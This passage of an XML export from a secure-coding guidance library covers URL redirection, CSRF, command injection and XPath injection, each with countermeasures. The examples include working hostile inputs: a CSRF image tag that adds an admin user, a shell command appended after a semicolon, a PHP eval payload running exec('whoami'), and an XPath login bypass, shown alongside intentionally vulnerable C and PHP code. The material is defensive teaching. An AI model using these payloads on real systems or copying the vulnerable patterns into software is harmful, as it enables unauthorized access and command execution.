&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A2E3F1BD-31BC-41BF-B147-C314A87C2172"&gt;Attack: Statistical Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5C9F30DE-BD35-4544-87C4-1D2E56D603A0"&gt;Attack: Timing Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:23F61C2C-53E5-4FCD-9AB4-4182DBC19D6D"&gt;Attack: Sniff Memory for Secrets Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EA8E596E-3498-4DA4-A4C7-55AAAB28B807"&gt;Guideline: Encrypt Sensitive Data in the Database
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3DC61B01-7418-4CF8-A193-BF968471796A"&gt;Guideline: Store Passwords Securely
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:AE7F27AF-7253-462F-8A29-6AB2AA202C05"&gt;Guideline: Encrypt Communication Links
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:440137A2-948A-4485-A137-E3CC8207F801"&gt;Guideline: Use a Secure Key Storage Location
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>bfc48dfe-4235-4eaf-b290-f418a11ec876</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>URL Redirection Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Many web applications use URL redirection as a feature to direct a user to another site or page on the same site. An attacker may be able to leverage this vulnerability to trick users into entering sensitive information into a malicious website while seemingly
 navigating within a trusted website.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Website forgery&lt;/strong&gt;: If an attacker can redirect a user from one trusted site to another site, the victim may not notice the redirection and extend trust to a malicious web site.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Improper use of redirection. &lt;/li&gt;&lt;li&gt;Failure to properly alert the user when a redirection is about to occur.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Never allow silent redirects to a user specified URL, even if the hostname is fixed.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;The login page for a web application has a feature that redirects the user, with a full query string, to a specified page within the site after the user logs in. This is used to allow pages to force the user to login before they are accessed, without losing
 track of the page the user was attempting to load. Unfortunately, this application also has pages, which alter the application state with a single get request. This combination allows an attacker to craft a single URL which will ask the user for their credentials
 on the legitimate login page, and subsequently perform some action as that user, without the user's knowledge. In order to fix this, the redirect links should be signed by the application in some way and protected against replay, thus guaranteeing that only
 legitimate uses of the feature will occur. Additionally, redirect strings should be passed as POST variables thus preventing attackers from crafting links that look like they are part of the legitimate site.&lt;/p&gt;
&lt;p&gt;In another example, a page has a utility function which allows developers to construct transparent redirects to other sites. This allows a phishing group to construct a seemingly legitimate URL on the application site which redirects silently to a malicious
 site. They can then pass this URL out to unsuspecting users, who can be tricked into visiting the malicious site while believing they're using the legitimate one.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://seclists.org/webappsec/2006/q1/0066.html"&gt;http://seclists.org/webappsec/2006/q1/0066.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.pc-help.org/obscure.htm"&gt;http://www.pc-help.org/obscure.htm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Attack: Phishing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:FC3DFE32-7252-4AB2-A92B-2C7A77D67253"&gt;Attack: Request Smuggling Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2B17E816-C6C4-4B05-BE92-01DC71073F66"&gt;Attack: Response Splitting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2288423A-5696-41EA-A421-05EAD6460E4C"&gt;Attack: Cross Site Request Forgery&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c491ef3a-b339-49ab-8291-f13de1f5187c</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Cross Site Request Forgery Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Application State</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;All web applications.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;A Cross Site Request Forgery attack occurs when an attacker tricks a victim into loading a page that contains a malicious request. This request may be able to change the state of the web application and is possible because the request is sent in the context
 of the logged in victim. For many sites each request automatically sends the victim's credentials such as the session cookie or authentication credentials. Due to this fact there is no way to distinguish the false request from a legitimate request.&lt;/p&gt;
&lt;p&gt;Cross Site Request Forgery attacks are known by other names including XSRF, Session Riding, One-Click and Zero-Click attacks.
&lt;/p&gt;
&lt;p&gt;A One-Click attack refers to a link that causes a malicious action to be performed when a victim clicks on it. A Zero-Click attack is automatically executed upon page load. A common way to perform a zero-click attack is to embed the request in the source
 of an image.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Elevation of privilege&lt;/strong&gt; - the attacker can execute commands on the web application on behalf of the victim&lt;/p&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;p&gt;Executing single requests that can change the state of the application, such as add users, change account balances or passwords, etc.&lt;/p&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Add a session identifier or nonce value to each session and/or viewstate to track each request.
&lt;/li&gt;&lt;li&gt;Use &amp;quot;double submit&amp;quot; cookies (for Ajax requests only). &lt;/li&gt;&lt;li&gt;Minimize single request GET commands. &lt;/li&gt;&lt;li&gt;Never allow a single request to change the state of the web application.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;If the application allows a user to change the state of the application in a single request this attack is possible. In this example the web application allows a logged in administrator to create a new user sending a single GET request.&lt;/p&gt;
&lt;p&gt;This GET request looks like this:&lt;/p&gt;
&lt;pre&gt;GET http://teammentorexample.com/adduser.aspx?username=joe&amp;amp;password=1234&amp;amp;usertype=userHTTP/1.1&lt;/pre&gt;
&lt;p&gt;The attacker discovers that this request will create a new user and creates his own request which he embeds in an e-mail with the following image tag:&lt;/p&gt;
&lt;pre&gt;&amp;lt;img src=&amp;quot;http://teammentorexample.com/adduser.aspx?username=HACKER&amp;amp;password=TEST&amp;amp;usertype=admin&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;p&gt;When the victim's e-mail client attempts to download the image located at the above source the request is made without the knowledge of the victim.
&lt;/p&gt;
&lt;p&gt;The application should require a two step authorization mechanism for any change to server state. In this example the server should send the client a nonce value to verify the admin would indeed like to add this user. The admin would have to verify the action
 on a separate page and return the nonce value. Only after the server receives the action and verifies the nonce should the user be created.
&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;p&gt;To learn more about CSRF attacks, see:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.owasp.org/index.php/Cross-Site_Request_Forgery"&gt;http://www.owasp.org/index.php/Cross-Site_Request_Forgery&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.cgisecurity.com/articles/csrf-faq.shtml"&gt;http://www.cgisecurity.com/articles/csrf-faq.shtml&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.owasp.org/index.php/Testing_for_CSRF"&gt;http://www.owasp.org/index.php/Testing_for_CSRF&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Attack: Phishing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5582C496-8E58-4EF8-86EA-D0E565197525"&gt;Attack: Reflection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5B0B4683-2F43-4F71-8DF4-121013673B4C"&gt;Attack: URL Redirection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B"&gt;Attack: HTTP Session Hijacking Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:ECAF57F9-0C13-4FC2-B298-811A706BED8F"&gt;Guideline: Do Not Place Sensitive Data in Parameters
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:04A281E9-1078-48B4-ABBC-74CB259F8C92"&gt;Guideline: Use Page.ViewStateUserKey to Counter Cross Site Request Forgery Attacks
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BB960347-F2E9-4926-8B75-ECCEE36D3EE8"&gt;Guideline: Protect Session Cookies
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c97da133-1150-4789-9d18-73ba221a4fba</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Command Injection Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;All applications.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Command injection problems are a subset of injection problems in which the process is tricked into either executing code or calling external processes of the attacker's choice through the injection of control information into the data stream.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Elevation of Privilege:&lt;/strong&gt; Command injection can allow for the execution of arbitrary commands and code by the attacker.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Failure to Validate User Input:&lt;/strong&gt; Situations where control information and data are mixed create opportunities for command injection.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Validate user input&lt;/strong&gt;. Prevent commands from being included in data by validating input for type, length, range, and format. Whitelist acceptable input and reject everything else. Escape meta characters and be aware of canonicalization issues.
 Remember that data may be changed as it flows through the program, so validating at multiple stages is often appropriate.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do not use input data in commands directly&lt;/strong&gt;. Clever formatting may be used so that the user's input is treated as its own separate command instead of as data. Therefore, validate the input and explicitly type it as data so that it cannot
 be interpreted as a command even if it contains one. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Avoid using command interpreters&lt;/strong&gt;. Although not always practical, using a well maintained API will have better results than invoking commands through an interpreter or external process.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;The following code is wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:
&lt;/p&gt;
&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int main(int argc, char **argv) {  char cat[] = &amp;quot;cat &amp;quot;;  char *command;  size_t commandLength;  commandLength = strlen(cat) &amp;#43; strlen(argv[1]) &amp;#43; 1;  command = (char *) malloc(commandLength);  strncpy(command, cat, commandLength);  strncat(command, argv[1], (commandLength - strlen(cat)) ); system(command);  return (0);}&lt;/pre&gt;
&lt;p&gt;Used normally, the output is simply the contents of the file requested: &lt;/p&gt;
&lt;pre&gt;$ ./catWrapper Story.txtWhen last we left our heroes...&lt;/pre&gt;
&lt;p&gt;However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:
&lt;/p&gt;
&lt;pre&gt;$ ./catWrapper Story.txt; lsWhen last we left our heroes...Story.txt doubFree.c nullpointer.cunstosig.c www* a.out*format.c strlen.c useFree*catWrapper* misnull.c strlength.c useFree.c commandinjection.c nodefault.c trunc.c writeWhatWhere.c&lt;/pre&gt;
&lt;p&gt;If catWrapper had been set to have a higher privilege level than the standard user or could be executed anonymously, arbitrary commands could be executed with that higher privilege.
&lt;/p&gt;
&lt;p&gt;Another example of this type of behavior can be seen with XSL, the style sheet language for XML. The primary purpose of XSL is to provide an easy and modular way to transform XML documents into other XML documents such as HTML. In particular, different XSL
 styles can be attached to the same XML and are sometimes supplied by the user. Microsoft extended the functionality of XSL to allow scripting code to be embedded in the style sheets with the &amp;lt;msxsl:script&amp;gt; tag. If an attacker has the ability to modify or replace
 the XSL style sheet in use, they can therefore inject any command to the system running the application simply by including it in the style sheet.&lt;/p&gt;
&lt;p&gt;In many programming languages there is an eval() function that, as the name suggests, evaluates a string as an expression. Among the members of this list are the commonly used JavaScript, ASP, Python, Perl, Ruby, and PHP. Blurring the distinction between
 data and code presents a huge security risk; this case is no different. User input is sometimes used in eval() expressions allowing arbitrary code to be executed. Consider an example where eval() is used in a php application to join strings:&lt;/p&gt;
&lt;pre&gt;$name; // ask the user for their name and store it here$str = '$user stole my coffee!';$str_after_eval = eval(&amp;quot;$str;&amp;quot;);echo $str. &amp;quot;\n&amp;quot;;echo $str_after_eval. &amp;quot;\n&amp;quot;;&lt;/pre&gt;
&lt;p&gt;If the user enters the name &amp;quot;Alice&amp;quot;, this code will output the following:&lt;/p&gt;
&lt;pre&gt;$user stole my coffee!Alice stole my coffee!&lt;/pre&gt;
&lt;p&gt;However, if the user enters the name &amp;quot;echo exec('whoami'); echo&amp;quot; then the application will return the name of the system user running the php/html application. Any system command or external program in the path could be run in this fashion.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on Command Injection, see the &lt;a href="http://www.e-articles.info/e/a/title/Command-Injection/"&gt;
Command Injection &lt;/a&gt;article at e-articles.info. &lt;/li&gt;&lt;li&gt;For more information on the Javascript Eval function, see the Wikipedia Eval article at
&lt;a href="http://en.wikipedia.org/wiki/Eval"&gt;http://en.wikipedia.org/wiki/Eval&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;For more information on script blocks in XSL, see &lt;a href=" http://msdn2.microsoft.com/en-us/library/wxaw5z5e.aspx"&gt;
Script Blocks Using msxsl:script &lt;/a&gt;on MSDN. &lt;/li&gt;&lt;li&gt;For more information on XSL transformations, see &lt;a href="http://en.wikipedia.org/wiki/XSL_Transformations"&gt;
XSL Transformations&lt;/a&gt; on wikipedia. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38"&gt;Attack: Canonicalization Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017"&gt;Attack: XML Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0"&gt;Attack: Xpath-XQuery Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Guideline: Do Not Rely on Request Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E"&gt;Guideline: Filter All User-Supplied Filename and Path Input
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>dfdb2801-2abe-44d3-93ff-9f6254197978</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Xpath-XQuery Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Any application that can manipulate XML documents through Xpath/XQuery &lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;An Xpath/XQuery attack exploits vulnerabilities in input validation to run arbitrary commands in XML databases. This attack works in much the same way as a SQL injection attack but with an XML target instead of a SQL target. This attack can occur when your
 application uses input directly from a user to construct an Xpath/XQuery statement to access XML tables. Using the Xpath/XQuery attack the attacker can execute arbitrary Xpath/XQuery statements on an XML database. This attack is often more damaging than a
 SQL injection attack as permissions are not enforced and the attacker’s query can access every part of the XML document. With an Xpath/XQuery attack it is possible to retrieve, manipulate, and destroy any data stored in the XML document.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality:&lt;/strong&gt; Since XML generally holds sensitive data, loss of confidentiality is a frequent problem with XPath/XQuery injection vulnerabilities.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Authentication:&lt;/strong&gt; If poor XPath/XQuery commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Authorization:&lt;/strong&gt; If authorization information is held in an XML document, it may be possible to change this information through the successful exploitation of an XPath/XQuery injection vulnerability.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Integrity:&lt;/strong&gt; Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with an XPath/XQuery injection attack.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Weak input validation. &lt;/li&gt;&lt;li&gt;Generating XPath expressions by dynamically concatenating strings with user supplied data.
&lt;/li&gt;&lt;li&gt;Failure to escape single quotes, double quotes, and other potentially dangerous characters.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Constrain input.&lt;/strong&gt; Use vigorous white-list style checking on any user input that may be used as part of an XQuery command. This will also help prevent meta characters from being added to your stored data set which will be used again.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use parameterized and precompiled XPath expressions in your XQuery instead of concatinating strings with user input.&lt;/strong&gt; Parameterized Xpath statements will accept characters that have special meaning to Xpath (like single quote) without problems
 because they are strongly typed. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use escaping routines.&lt;/strong&gt; If you cannot use parameters and must generate XPath expressions dynamically, use escaping routines to handle special characters that have meaning to the database.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do not echo XQuery errors.&lt;/strong&gt; Catch any exceptions on the server and return generic error messages to the client.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;Consider the following XML file, being used by an application to log users into the application&lt;/p&gt;
&lt;pre&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt; &amp;lt;users&amp;gt;    &amp;lt;user&amp;gt;       &amp;lt;username&amp;gt;admin&amp;lt;/username&amp;gt;       &amp;lt;password&amp;gt;8af2&amp;amp;&amp;lt;/password&amp;gt;       &amp;lt;account&amp;gt;admin&amp;lt;/account&amp;gt;    &amp;lt;/user&amp;gt;    &amp;lt;user&amp;gt;       &amp;lt;username&amp;gt;user1&amp;lt;/username&amp;gt;       &amp;lt;password&amp;gt;password&amp;lt;/password&amp;gt;       &amp;lt;account&amp;gt;guest&amp;lt;/account&amp;gt;    &amp;lt;/user&amp;gt;    &amp;lt;user&amp;gt;       &amp;lt;username&amp;gt;user2&amp;lt;/username&amp;gt;       &amp;lt;password&amp;gt;1234&amp;lt;/password&amp;gt;       &amp;lt;account&amp;gt;guest&amp;lt;/account&amp;gt;    &amp;lt;/user&amp;gt; &amp;lt;/users&amp;gt;&lt;/pre&gt;
&lt;p&gt;A developer could use the following Xpath command to return all the users with the username&lt;/p&gt;
&lt;pre&gt;‘user1’ and password ‘password’string(//user[username/text()='user1'        and password/text()='password']/account/text())&lt;/pre&gt;
&lt;p&gt;However, without proper input validation the attacker could easily input a logic statement to manipulate the output of the query. An attacker could provide the following string to the Xpath statement above.&lt;/p&gt;
&lt;pre&gt;Username: user1Password: ' or '1' = '1&lt;/pre&gt;
&lt;p&gt;This will change the Xpath statement to look like this:&lt;/p&gt;
&lt;pre&gt;string(//user[username/text()='user1' and password/text()=''        or '1' = '1']/account/text())&lt;/pre&gt;
&lt;p&gt;The password portion of the query will always resolve to true which means that the application will authenticate the attacker as user1 even though no password was provided.&lt;/p&gt;
&lt;p&gt;A good way to fix this example is to use a parameterized query. The idea here is to create a precompiled query that gets values from parameters instead of dynamically creating an XPath expression by concatination at run time. Let $username and $password
 be string variables that hold the users input. Then construct a query in the following way:&lt;/p&gt;
&lt;pre&gt;&amp;quot;//user[user[username/text()=$username and password/text()=$password]&amp;quot;&lt;/pre&gt;
&lt;p&gt;If you are using .NET see the Additional Resources below for another example of how this works.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.tkachenko.com/blog/archives/000385.html"&gt;http://www.tkachenko.com/blog/archives/000385.html&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://www.owasp.org/index.php/XML_Injection"&gt;http://www.owasp.org/index.php/XML_Injection&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://palisade.plynt.com/issues/2005Jul/xpath-injection/index.php"&gt;http://palisade.plynt.com/issues/2005Jul/xpath-injection/index.php&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://secureitalliance.org/blogs/watchfire/archive/2006/02/10/660.aspx"&gt;http://secureitalliance.org/blogs/watchfire/archive/2006/02/10/660.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017"&gt;Attack: XML Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Guideline: Do Not Rely on Request Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0FFC3880-7F2B-47A5-BC54-F9BD39117BDD"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ec178496-024d-4b3c-8381-8db94767e539</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
